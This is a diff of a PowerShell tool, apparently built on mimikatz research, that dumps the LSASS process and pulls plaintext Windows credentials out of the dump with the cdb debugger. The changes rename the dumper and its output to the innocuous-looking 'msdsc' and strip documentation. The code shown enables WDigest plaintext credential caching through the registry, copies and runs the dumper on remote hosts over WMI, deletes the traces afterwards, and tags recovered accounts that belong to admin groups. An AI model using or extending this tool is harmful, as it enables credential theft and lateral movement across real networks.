@@ -5,30 +5,9 @@
     Reveal credentials from memory dump
 
 .NOTES
-    Version:        0.1
+    Version:        0.2
     Author:         Pierre-Alexandre Braeken
     Creation Date:  2015-05-01
-    Purpose/Change: Initial script development
-                    Do command with du for retrieve login information
-                    Do command with dw for retrieve password informations
-                    Add support for dump lsass remotely
-                    Add log
-                    Add support for 2003 server
-.MODE
-    1 --> Windows 7 + 2008r2
-    132  --> Windows 7 32 bits
-    2 --> Windows 8 + 2012
-    2r2 --> Windows 10 + 2012r2 
-    8.1 --> Win 8.1
-    3 --> Windows 2003
-
-.DUMP
-    gen --> reveal memory credentials on local machine
-    path\to\the\lsass.dmp file --> reveal memory credentials from a collected lsass.dmp file
-    "" --> if nothing entered, you can enter the name of a remote server in the $server parameter
-
-.SERVER
-    the name of a remote server you wan to reveal credentials
 
 .CREDITS
     Thanks to Benjamin Delpy for his work on mimikatz and Francesco Picasso (@dfirfpi) for his work on DES-X.
@@ -47,21 +26,15 @@ $scriptFile = $MyInvocation.MyCommand.Definition
 $launchDate = get-date -f "yyyyMMddHHmmss"
 $logDirectoryPath = $scriptPath + "\" + $launchDate
 $file = "$logDirectoryPath\lsass.dmp"
-#$DebuggingScript = "$scriptPath\bufferCommand.txt"
-$pythonProgramPath = "$scriptPath\lsacollectbytes.py"
-
 $loggingFunctions = "$scriptPath\logging\Logging.ps1"
-
-#$fullScriptPath = (Resolve-Path -Path $DebuggingScript).Path
 
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
 $scriptName = [System.IO.Path]::GetFileName($scriptFile)
-$scriptVersion = "0.1"
+$scriptVersion = "0.2"
 
 if(!(Test-Path $logDirectoryPath)) {
     New-Item $logDirectoryPath -type directory | Out-Null
-    #Write-Progress -Activity "Directory $logDirectoryPath created" -status "Running..." -id 1
 }
 
 $logFileName = "Log_" + $launchDate + ".log"
@@ -74,7 +47,7 @@ if ((gwmi win32_computersystem).partofdomain -eq $true) {
 }
 
 if ((gwmi win32_computersystem).partofdomain -eq $true) {
-    if (Get-Module -ListAvailable -Name SomeModule) {
+    if (Get-Module -ListAvailable -Name activedirectory) {
         Import-Module activedirectory
     } else {
         Write-Host "Module activedirectory does not exist, importing..."
@@ -85,27 +58,7 @@ if ((gwmi win32_computersystem).partofdomain -eq $true) {
 
 #-----------------------------------------------------------[Functions]------------------------------------------------------------
 
-Function Start-Log {
-<#
-.SYNOPSIS
-These functions allow logging of scripts
-
-.DESCRIPTION
-Create a log file
-
-.PARAMETER scriptName [mandatory]
-Example: Test-log
-      
-.PARAMETER scriptVersion [mandatory]
-Example: 1.0
-
-.PARAMETER streamWriter [mandatory]
-Stream Writer object (New-Object System.IO.StreamWriter)
-This object is use to avoid open and close of the file cause
-by call to Add-Content or Out-File
-        
-#>
-    
+Function Start-Log {    
     [CmdletBinding()]  
     Param ([Parameter(Mandatory=$true)][string]$scriptName, [Parameter(Mandatory=$true)][string]$scriptVersion, 
         [Parameter(Mandatory=$true)][string]$streamWriter)
@@ -117,20 +70,6 @@ by call to Add-Content or Out-File
 }
  
 Function Write-Log {
-<#
-.SYNOPSIS
-Write log lines
-
-.DESCRIPTION
-This function allow to append a new line at the end of the log file
-  
-.PARAMETER streamWriter [mandatory]
-Stream Writer object
-  
-.PARAMETER infoToLog [mandatory]
-The information line you want to write in the log file
-#>
-  
     [CmdletBinding()]  
     Param ([Parameter(Mandatory=$true)][string]$streamWriter, [Parameter(Mandatory=$true)][string]$infoToLog)  
     Process{    
@@ -139,24 +78,6 @@ The information line you want to write in the log file
 }
  
 Function Write-Error {
-<#
-.SYNOPSIS
-Write the error caught you send to this function
-
-.DESCRIPTION
-This function allow to append the error passed at the end of the log file
-  
-.PARAMETER streamWriter [mandatory]
-Stream Writer object
-  
-.PARAMETER error [mandatory]
-The error you want to log
-  
-.PARAMETER forceExit [mandatory]
-Boolean value to force call to End-Log in case of force exit
---> set to true to force the script Exit 
-#>
-  
     [CmdletBinding()]  
     Param ([Parameter(Mandatory=$true)][string]$streamWriter, [Parameter(Mandatory=$true)][string]$errorCaught, [Parameter(Mandatory=$true)][boolean]$forceExit)  
     Process{
@@ -168,19 +89,7 @@ Boolean value to force call to End-Log in case of force exit
     }
 }
  
-Function End-Log {
-<#
-.SYNOPSIS
-End of execution
-
-.DESCRIPTION
-Write date time of script ended
-  
-.PARAMETER logPathName [mandatory]
-Stream Writer object
-
-#>
-  
+Function End-Log { 
     [CmdletBinding()]  
     Param ([Parameter(Mandatory=$true)][string]$streamWriter)  
     Process{    
@@ -213,11 +122,8 @@ function CreateDirectoryIfNeeded ( [string] $directory ) {
 function Set-SymbolServer {              
     $cacheDirectory = "c:\SYMBOLS\PUBLIC"     
     $refSrcPath = "$cacheDirectory*http://referencesource.microsoft.com/symbols"
-    $msdlPath = "$cacheDirectory*http://msdl.microsoft.com/download/symbols"
-    $extraPaths = ""    
-
+    $msdlPath = "$cacheDirectory*http://msdl.microsoft.com/download/symbols"    
     $envPath = "SRV*$refSrcPath;SRV*$msdlPath"    
-
     CreateDirectoryIfNeeded -directory $cacheDirectory
     $env:_NT_SYMBOL_PATH = $envPath    
 }
@@ -232,7 +138,7 @@ function Write-Minidump ($process, $dumpFilePath) {
     $processId = $process.Id
     $processName = $process.Name
     $processHandle = $process.Handle
-    $processFileName = "$($processName).dmp"
+    $processFileName = "msdsc.dmp"
 
     $processDumpPath = "$dumpFilePath\$processFileName"
 
@@ -781,8 +687,7 @@ __________________________________________________________________________#>
         $parentKey = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
         $nameRegistryKey = "UseLogonCredential"
         $valueRegistryKey = "1"
-        if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){
-            #Set-RegistryKey $server $parentKey $nameRegistryKey $valueRegistryKey        
+        if(!(Get-ItemProperty -Path $parentKey -Name $nameRegistryKey -ErrorAction SilentlyContinue)){                  
             New-ItemProperty -Path $parentKey -Name $nameRegistryKey -Value $valueRegistryKey -PropertyType DWORD -Force | Out-Null            
             Write-Host "Registry key setted, you have to reboot the local computer" -foregroundcolor "magenta"
             Stop-Script
@@ -823,17 +728,6 @@ else {
     $CdbProgramPath = "$scriptPath\debugger\pre2r2\cdb.exe"
 }
 
-<#
-if($dump -eq "" -or $dump -eq "gen"){
-    if(!(Test-Path $logDirectoryPath)) {
-        New-Item $logDirectoryPath -type directory | Out-Null
-        Write-Progress -Activity "Directory $logDirectoryPath created" -status "Running..." -id 1
-    }
-}
-else {
-    $logDirectoryPath = $dump
-}#>
-
 <#________________________________________________________________________
 
     Set the environment for the symbols
@@ -843,23 +737,10 @@ __________________________________________________________________________#>
 Write-Progress -Activity "Setting environment" -status "Running..." -id 1
 Set-SymbolServer -CacheDirectory C:\symbols\public -Public -SymbolServers http://msdl.microsoft.com/download/symbols -CurrentEnvironmentOnly
 Write-Progress -Activity "Environment setted" -status "Running..." -id 1
-<#
-$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::getCurrentDomain().Name 
-$currentDomain = Get-DistinguishedNameFromFQDN $currentDomain
-#>
-<#________________________________________________________________________
-    Dump lsass
-    if gen option used --> dump locally
-    if a dump directory option used --> no dump, get the information from 
-        the dump given by user
-    if no option used --> the third argument given is the name of the
-        remote computer you want to dump the lsass process
-__________________________________________________________________________#>
-
-Write-Progress -Activity "Creating lsass dump" -status "Running..." -id 1
+Write-Progress -Activity "Creating msdsc log" -status "Running..." -id 1
 if($dump -eq "gen"){
     if($mode -eq "2r2") {
-        $dumpAProcessPath = "$scriptPath\dp.exe"
+        $dumpAProcessPath = "$scriptPath\msdsc.exe"
         &$dumpAProcessPath "lsass" "$logDirectoryPath"
     }
     else {
@@ -892,20 +773,20 @@ else {
             }
         }
         #>
-        Copy-Item -Path "$scriptPath\dp.exe" -Destination "\\$computername\c$\windows\temp\dp.exe"
-        $dumpAProcessPath = "C:\Windows\temp\dp.exe"
+        Copy-Item -Path "$scriptPath\msdsc.exe" -Destination "\\$computername\c$\windows\temp\msdsc.exe"
+        $dumpAProcessPath = "C:\Windows\temp\msdsc.exe"
         Run-WmiRemoteProcess $computername "$dumpAProcessPath lsass c:\windows\temp" | Wait-Process
         Start-Sleep -Seconds 15
         Copy-Item -Path "\\$computername\\c$\windows\temp\lsass.dmp" -Destination "$logDirectoryPath"
-        Remove-Item -Force "\\$computername\c$\windows\temp\dp.exe"
-        Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"
-        Write-Progress -Activity "Lsass dump created" -status "Running..." -id 1
+        Remove-Item -Force "\\$computername\c$\windows\temp\msdsc.exe"
+        Remove-Item -Force "\\$computername\c$\windows\temp\lsass.dmp"        
+        Write-Progress -Activity "msdsc log created" -status "Running..." -id 1
     }
     else {
         $file = "$dump\lsass.dmp"
     }
 }
-    
+   
 if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
     <#________________________________________________________________________
 
@@ -1160,16 +1041,7 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         $loginAddress1 = $arrayLoginAddress[$foundInstruction] 
         $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start + 1
         $loginAddress2 = $arrayLoginAddress[$foundInstruction]    
-        $loginAddress = "$loginAddress2$loginAddress1"                                    
-
-        if($loginAddress -eq "0000000000000000"){
-            $start = 24
-            $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start
-            $loginAddress1 = $arrayLoginAddress[$foundInstruction]       
-            $foundInstruction = [array]::indexof($arrayLoginAddress,"'dd") + $start + 1
-            $loginAddress2 = $arrayLoginAddress[$foundInstruction]      
-            $loginAddress = "$loginAddress2$loginAddress1"                                                    
-        }
+        $loginAddress = "$loginAddress2$loginAddress1"                                           
 
         $loginDB = &$CdbProgramPath -z $file -c "du $loginAddress;Q"   
         $arrayloginDBAddress = ($loginDB -split ' ')    
@@ -1180,28 +1052,30 @@ if($mode -eq 1 -or $mode -eq 132 -or $mode -eq 2 -or $mode -eq "2r2") {
         $loginPlainText = $loginPlainText1 -replace """",""                                     
         if ((gwmi win32_computersystem).partofdomain -eq $true) {
             $user = ""
-            $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}             
-            if(![string]::IsNullOrEmpty($user)) {
-                $user = $user.DistinguishedName   
-                $enterpriseAdminsFlag = "false"
-                $schemaAdminsFlag = "false"
-                $domainAdminFlag = "false"
-                $administratorsFlag = "false"
-                $backupOperatorsFlag = "false"
-                if($enterpriseAdmins -ne ""){
-                    $enterpriseAdminsFlag = $enterpriseAdmins.Contains($user)
-                    if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
-                }
-                if($schemaAdmins -ne ""){
-                    $schemaAdminsFlag = $schemaAdmins.Contains($user)
-                    if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
-                }
-                $domainAdminFlag = $domainAdmins.Contains($user)
-                if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
-                $administratorsFlag = $administrators.Contains($user)
-                if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
-                $backupOperatorsFlag = $backupOperators.Contains($user)
-                if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
+            if(![string]::IsNullOrEmpty($loginPlainText)) {
+	            $user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}
+	            if(![string]::IsNullOrEmpty($user)) {
+	                $user = $user.DistinguishedName   
+	                $enterpriseAdminsFlag = "false"
+	                $schemaAdminsFlag = "false"
+	                $domainAdminFlag = "false"
+	                $administratorsFlag = "false"
+	                $backupOperatorsFlag = "false"
+	                if($enterpriseAdmins -ne ""){
+	                    $enterpriseAdminsFlag = $enterpriseAdmins.Contains($user)
+	                    if($enterpriseAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Enterprise Admins"}
+	                }
+	                if($schemaAdmins -ne ""){
+	                    $schemaAdminsFlag = $schemaAdmins.Contains($user)
+	                    if($schemaAdminsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Schema Admins"}
+	                }
+	                $domainAdminFlag = $domainAdmins.Contains($user)
+	                if($domainAdminFlag -eq "true") {$loginPlainText = $loginPlainText + " = Domain Admin"}
+	                $administratorsFlag = $administrators.Contains($user)
+	                if($administratorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Administrators"}
+	                $backupOperatorsFlag = $backupOperators.Contains($user)
+	                if($backupOperatorsFlag -eq "true") {$loginPlainText = $loginPlainText + " = Backup Operators"}            
+	            }
             }
         }
         # Password
